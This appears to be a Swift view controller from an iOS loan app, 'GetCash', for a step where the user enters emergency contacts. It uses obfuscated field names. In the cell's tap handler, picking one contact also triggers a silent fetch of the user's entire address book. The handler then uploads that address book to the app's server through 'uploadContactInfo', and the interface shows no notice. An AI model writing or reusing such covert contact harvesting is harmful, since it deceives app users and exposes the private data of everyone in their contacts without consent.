//
//  ContactViewController.swift
//  GetCash
//
//  Created by hekang on 2025/12/21.
//

import UIKit
import SnapKit
import MJRefresh
import TYAlertController
import RxSwift
import RxCocoa

class ContactViewController: BaseViewController {
    
    var name: String? {
        didSet {
            guard let name = name else { return }
            headView.config(title: name)
        }
    }
    
    var productID: String = ""
    
    var stepArray: [residenceModel] = []
    
    private let stepView = StepScrollView()
    
    private let viewModel = ContactViewModel()
    
    var modelArray: [relationsModel] = []
    
    private let contactManager = ContactManager()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitle("Next step", for: .normal)
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.backgroundColor = UIColor(hex: "#003BD1")
        nextBtn.titleLabel?.font = UIFont.systemFont(ofSize: 16, weight: UIFont.Weight(600))
        nextBtn.layer.cornerRadius = 24.pix()
        nextBtn.layer.masksToBounds = true
        return nextBtn
    }()
    
    lazy var whiteView: UIView = {
        let whiteView = UIView()
        whiteView.backgroundColor = .white
        return whiteView
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .white
        tableView.estimatedRowHeight = 60
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(ContactViewCell.self, forCellReuseIdentifier: "ContactViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        view.backgroundColor = UIColor.init(hex: "#C1CFFF")
        
        view.addSubview(headView)
        headView.bgView.backgroundColor = .clear
        headView.snp.makeConstraints { make in
            make.top.left.right.equalToSuperview()
            make.height.equalTo(87.pix())
        }
        
        headView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.backStepPageVc()
        }
        
        view.addSubview(stepView)
        stepView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(5)
            make.left.right.equalToSuperview()
            make.height.equalTo(72)
        }
        stepView.stepArray = stepArray
        stepView.setActiveStep(4)
        
        view.addSubview(whiteView)
        whiteView.snp.makeConstraints { make in
            make.top.equalTo(stepView.snp.bottom).offset(20)
            make.left.right.bottom.equalToSuperview()
        }
        
        whiteView.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.left.equalToSuperview().offset(16)
            make.height.equalTo(48.pix())
            make.centerX.equalToSuperview()
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom)
        }
        
        let coverView = UIView()
        coverView.backgroundColor = UIColor(hex: "#344786").withAlphaComponent(0.3)
        whiteView.addSubview(coverView)
        coverView.snp.makeConstraints { make in
            make.right.equalToSuperview().offset(-22)
            make.left.equalToSuperview().offset(26)
            make.top.equalToSuperview().offset(46)
            make.bottom.equalTo(nextBtn.snp.top).offset(-20)
        }
        
        let contentView = UIView()
        contentView.backgroundColor = UIColor(hex: "#FFFFFF")
        whiteView.addSubview(contentView)
        contentView.layer.borderWidth = 2
        contentView.layer.borderColor = UIColor.init(hex: "#2D4173").cgColor
        contentView.snp.makeConstraints { make in
            make.right.equalToSuperview().offset(-26)
            make.left.equalToSuperview().offset(24)
            make.top.equalToSuperview().offset(44)
            make.bottom.equalTo(nextBtn.snp.top).offset(-24)
        }
        
        let nameLabel = PaddedLabel()
        nameLabel.text = name
        nameLabel.textAlignment = .center
        nameLabel.font = UIFont.systemFont(ofSize: 16, weight: UIFont.Weight(700))
        nameLabel.layer.cornerRadius = 4
        nameLabel.layer.borderWidth = 1.5
        nameLabel.layer.borderColor = UIColor.init(hex: "#2D4173").cgColor
        nameLabel.layer.masksToBounds = true
        nameLabel.backgroundColor = UIColor.init(hex: "#FFE37C")
        whiteView.addSubview(nameLabel)
        nameLabel.snp.makeConstraints { make in
            make.height.equalTo(40)
            make.top.equalToSuperview().offset(24)
            make.centerX.equalToSuperview()
        }
        
        contentView.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalToSuperview().offset(44)
            make.left.right.equalToSuperview().inset(10)
            make.bottom.equalToSuperview().offset(-5)
        }
        
        nextBtn.rx
            .tap
            .throttle(.milliseconds(100), latest: false, scheduler: MainScheduler.instance)
            .withUnretained(self)
            .map { owner, _ in
                owner.modelArray.map { model in
                    [
                        "renewing": model.renewing ?? "",
                        "planet": model.planet ?? "",
                        "cheeks": model.cheeks ?? ""
                    ]
                }
            }
            .subscribe(onNext: { [weak self] phoneArray in
                guard let self = self else { return }
                if let jsonData = try? JSONSerialization.data(withJSONObject: phoneArray, options: []), let jsonString = String(data: jsonData, encoding: .utf8) {
                    Task {
                        do {
                            let json = ["childhood": self.productID, "awe": jsonString]
                            let model = try await self.viewModel.saveContactInfo(json: json)
                            if model.hoping == "0" {
                                self.backStepPageVc()
                            }else {
                                ToastManager.showMessage(message: model.recollected ?? "")
                            }
                        } catch {
                            
                        }
                    }
                }
            })
            .disposed(by: disposeBag)
        
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.contactInfo()
        }
    }
}

extension ContactViewController {
    
    private func contactInfo() async {
        do {
            let json = ["childhood": productID, "count": "1", ]
            let model = try await viewModel.getContactInfo(json: json)
            if model.hoping == "0" {
                self.modelArray = model.awe?.relations ?? []
            }else {
                ToastManager.showMessage(message: model.recollected ?? "")
            }
            self.tableView.reloadData()
        } catch {
            
        }
    }
    
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let cell = tableView.dequeueReusableCell(withIdentifier: "ContactViewCell", for: indexPath) as! ContactViewCell
        let model = self.modelArray[indexPath.row]
        cell.configWithModel(model: model)
        cell.oneTapClickBlcok = { [weak self] in
            guard let self = self else { return }
            tapClickCell(with: model, selectCell: cell)
        }
        cell.twoTapClickBlcok = { [weak self] in
            guard let self = self else { return }
            /// single_contact_info
            contactManager.openContactPicker(from: self) { [weak self] jsonString, error in
                guard let self = self else { return }
                if let jsonString = jsonString {
                    if let data = jsonString.data(using: .utf8),
                       let contacts = try? JSONDecoder().decode([ContactInfo].self, from: data),
                       let contact = contacts.first {
                        tapPhoneClickCell(with: model, selectCell: cell, contactModel: contact)
                    }
                }
            }
            
            /// all_contact_info
            contactManager.fetchAllContacts { [weak self] jsonString, error in
                guard let self = self, let jsonString = jsonString  else { return }
                Task {
                    await self.uploadAllMessage(with: jsonString)
                }
            }
        }
        return cell
    }
    
    private func tapClickCell(with model: relationsModel, selectCell: ContactViewCell) {
        let popView = PopAlertEnmuView(frame: self.view.bounds)
        let modelArray = model.mortals ?? []
        
        for (index, item) in modelArray.enumerated() {
            let text = model.renewing ?? ""
            let target = String(item.courteous ?? 0)
            if target == text {
                popView.selectedIndex = index
            }
            popView.modelArray = modelArray
        }
        
        popView.configTitle(with: model.bitter ?? "")
        let alertVc = TYAlertController(alert: popView, preferredStyle: .actionSheet)
        self.present(alertVc!, animated: true)
        
        popView.cancelBlock = { [weak self] in
            self?.dismiss(animated: true)
        }
        
        popView.confirmBlock = { [weak self] listModel in
            guard let self = self else { return }
            self.dismiss(animated: true) {
                selectCell.phoneTextFiled.text = listModel.planet ?? ""
                model.renewing = String(listModel.courteous ?? 0)
            }
        }
        
    }
    
    private func tapPhoneClickCell(with model: relationsModel,
                                   selectCell: ContactViewCell,
                                   contactModel: ContactInfo) {
        let name = contactModel.planet
        let phone = contactModel.stars
        selectCell.nameTextFiled.text = String(format: "%@-%@", name, phone)
        model.planet = name
        model.cheeks = phone
    }
    
    private func uploadAllMessage(with jsonStr: String) async {
        do {
            let json = ["awe": jsonStr]
            let _ = try await viewModel.uploadContactInfo(json: json)
        } catch {
            
        }
    }
    
}
